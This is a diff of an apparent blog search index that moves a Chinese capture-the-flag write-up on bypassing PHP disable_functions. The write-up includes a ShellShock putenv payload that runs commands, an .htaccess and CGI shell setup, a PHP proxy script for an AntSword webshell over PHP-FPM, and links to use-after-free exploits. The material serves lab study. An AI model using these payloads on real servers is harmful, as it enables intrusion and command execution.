@@ -175,6 +175,79 @@
       </categories>
   </entry>
   <entry>
+    <title>Bypass disable_function</title>
+    <url>/2022/05/Bypass%20disable_function/</url>
+    <content><![CDATA[<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>发现打不开 flag 文件<br>要使用蚁剑插件<code>绕过disabled function</code></p>
+<blockquote>
+<p>如果蚁剑插件市场打不开的话可以去 github 搜<br>github 上有说明 按着他的安</p>
+</blockquote>
+<p>连上之后在蚁剑主页面右键 webshell 使用该插件<br>按照步骤操作<br>成功后把 webshell 地址改为 http:&#x2F;&#x2F;……&#x2F;.antproxy.php<br>在连上就能 tac 了<br><code>tac /flag</code></p>
+<h2 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h2><p>进去发现连不上<br>查了下大佬博客说是环境不正常<br>原理如下</p>
+<blockquote>
+<p>如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在 shell 启动的时候才生效。</p>
+</blockquote>
+<p>脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot; tac /flag&gt;/var/www/html/1.txt&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_DMIND=() &#123; :; &#125;;<span class="subst">$cmd</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;dmind&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/var/www/html/1.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用蚁剑传进去后<br>浏览器访问这个文件即可在 1.txt 看到 flag<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254011280-13.png" alt="在这里插入图片描述"></p>
+<h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254013871-16.png" alt="在这里插入图片描述"></p>
+<p>如果.htaccess 文件被攻击者修改的话，攻击者就可以利用 apache 的 mod_cgi 模块，直接绕过 PHP 的任何限制，来执行系统命令</p>
+<blockquote>
+<p>1.Mod CGI 就是把 PHP 做为 APACHE 一个内置模块，让 apache http 服务器本身能够支持 PHP 语言，不需要每一个请求都通过启动 PHP 解释器来解释 PHP. 2.它可以将 cgi-script 文件或者用户自定义标识头为 cgi-script 的文件通过服务器运行. 3.在.htaccess 文件中可定制用户定义标识头 4.添加 Options +ExecCGI，代表着允许使用 mod_cgi 模块执行 CGI 脚本 5.添加 AddHandler cgi-script .cgi，代表着包含.cgi 扩展名的文件都将被视为 CGI 程序</p>
+</blockquote>
+<p>条件</p>
+<ol>
+<li>必须是 apache 环境</li>
+<li>mod_cgi 已经启用</li>
+<li>必须允许.htaccess 文件，也就是说在 httpd.conf 中，要注意 AllowOverride 选项为 All，而不是 none</li>
+<li>必须有权限写.htaccess 文件</li>
+</ol>
+<h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><p>.htaccess</p>
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">Options +ExecCGI AddHandler cgi-script .cgi</span></span><br></pre></td></tr></table></figure>
+
+<p>shell.cgi</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b</span><br></pre></td></tr></table></figure>
+
+<h3 id="简单方法："><a href="#简单方法：" class="headerlink" title="简单方法："></a>简单方法：</h3><p>蚁剑连<br>还是那个插件 bypass！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254016967-19.png" alt="在这里插入图片描述"></p>
+<h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><ol>
+<li>FPM 是 fast-cgi 的协议解析器</li>
+<li>webserver 使用 cgi 协议封装好用户的请求发送给 FPM</li>
+<li>FPM 按照 cgi 的协议将 TCP 流解析成真正的数据</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254019084-22.png" alt="在这里插入图片描述"><br>蚁剑 bypass<br>模式：FPM<br>地址：127.0.0.1：9000 或 localhost：9000<br>植入后修改 shell 地址为 http:&#x2F;&#x2F;……&#x2F;.antproxy.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$headers</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$k</span>,<span class="string">&#x27;HTTP_&#x27;</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^HTTP/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>));</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_\w/&#x27;</span>,<span class="string">&#x27;header_callback&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^_/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;Host&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$headers</span>[]=<span class="string">&quot;<span class="subst">$k</span>:<span class="subst">$v</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$str</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span>(<span class="params"><span class="variable">$sResponse</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>)=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$sResponse</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$ret</span>=<span class="keyword">array</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="variable">$sResponse</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="title function_ invoke__">parseHeader</span>(<span class="variable">$sResponse</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">120</span>);</span><br><span class="line"><span class="variable">$headers</span>=<span class="title function_ invoke__">get_client_header</span>();</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">61921</span>;</span><br><span class="line"><span class="variable">$errno</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$errstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> .= <span class="string">&quot;?&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$timeout</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$method</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="variable">$post_data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> = <span class="variable">$method</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: &quot;</span>.<span class="variable">$host</span>.<span class="string">&quot;:&quot;</span>.<span class="variable">$port</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Content-Type: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Content-length:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>);</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;&quot;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">4096</span>))&#123;</span><br><span class="line">    <span class="variable">$response</span> .= <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$response</span>, <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="variable">$pos</span>+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><blockquote>
+<p>利用的是 PHP Garbage Collector 程序中的堆溢出触发</p>
+</blockquote>
+<p><a href="https://bugs.php.net/bug.php?id=72530">题目附件</a><br><em>其实蚁剑的 reference 就有这附件 包括后面的大佬脚本</em><br>可以用蚁剑一把梭<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254029334-25.png" alt="在这里插入图片描述"></p>
+<p>另附<br><code>[大佬poc](https://github.com/mm0r1/exploits)</code><br>UAF 的脚本里面都有<br><code>tql！</code></p>
+<h3 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h3><blockquote>
+<p>漏洞利用 json 在序列化中的堆溢出触发 bypass，漏洞为 bug #77843</p>
+</blockquote>
+<p>蚁剑一把梭</p>
+<h3 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h3><blockquote>
+<p>漏洞利用的是 debug_backtrace 这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为 bug #76047</p>
+</blockquote>
+<h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><p><a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI 详解</a></p>
+<blockquote>
+<p><code>**disabled function:**</code><br>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</p>
+</blockquote>
+<h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h2><ul>
+<li>github.com&#x2F;AntSwordProject&#x2F;AntSword-Labs&#x2F;tree&#x2F;master&#x2F;bypass_disable_functions&#x2F;9&#x2F;</li>
+<li><a href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80">https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80</a></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$headers</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$k</span>,<span class="string">&#x27;HTTP_&#x27;</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^HTTP/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>));</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_\w/&#x27;</span>,<span class="string">&#x27;header_callback&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^_/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;Host&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$headers</span>[]=<span class="string">&quot;<span class="subst">$k</span>:<span class="subst">$v</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$str</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span>(<span class="params"><span class="variable">$sResponse</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>)=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$sResponse</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$ret</span>=<span class="keyword">array</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="variable">$sResponse</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="title function_ invoke__">parseHeader</span>(<span class="variable">$sResponse</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">120</span>);</span><br><span class="line"><span class="variable">$headers</span>=<span class="title function_ invoke__">get_client_header</span>();</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">63947</span>;</span><br><span class="line"><span class="variable">$errno</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$errstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> .= <span class="string">&quot;?&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$timeout</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$method</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="variable">$post_data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> = <span class="variable">$method</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: &quot;</span>.<span class="variable">$host</span>.<span class="string">&quot;:&quot;</span>.<span class="variable">$port</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Content-Type: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Content-length:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>);</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;&quot;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">4096</span>))&#123;</span><br><span class="line">    <span class="variable">$response</span> .= <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$response</span>, <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="variable">$pos</span>+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfhub-彩蛋</title>
     <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
     <content><![CDATA[<h2 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h2><p>一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页 limit 都是 12 但 offset 在变化<br>于是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述">这样设置参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述">在长度为 1000 到 6、7 千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述">在最后一行</p>
@@ -268,107 +341,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Bypass disable_function</title>
-    <url>/2022/05/Bypass%20disable_function/</url>
-    <content><![CDATA[<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>发现打不开 flag 文件<br>要使用蚁剑插件<code>绕过disabled function</code></p>
-<blockquote>
-<p>如果蚁剑插件市场打不开的话可以去 github 搜<br>github 上有说明 按着他的安</p>
-</blockquote>
-<p>连上之后在蚁剑主页面右键 webshell 使用该插件<br>按照步骤操作<br>成功后把 webshell 地址改为 http:&#x2F;&#x2F;……&#x2F;.antproxy.php<br>在连上就能 tac 了<br><code>tac /flag</code></p>
-<h2 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h2><p>进去发现连不上<br>查了下大佬博客说是环境不正常<br>原理如下</p>
-<blockquote>
-<p>如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在 shell 启动的时候才生效。</p>
-</blockquote>
-<p>脚本</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot; tac /flag&gt;/var/www/html/1.txt&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_DMIND=() &#123; :; &#125;;<span class="subst">$cmd</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;dmind&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/var/www/html/1.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>用蚁剑传进去后<br>浏览器访问这个文件即可在 1.txt 看到 flag<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254011280-13.png" alt="在这里插入图片描述"></p>
-<h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254013871-16.png" alt="在这里插入图片描述"></p>
-<p>如果.htaccess 文件被攻击者修改的话，攻击者就可以利用 apache 的 mod_cgi 模块，直接绕过 PHP 的任何限制，来执行系统命令</p>
-<blockquote>
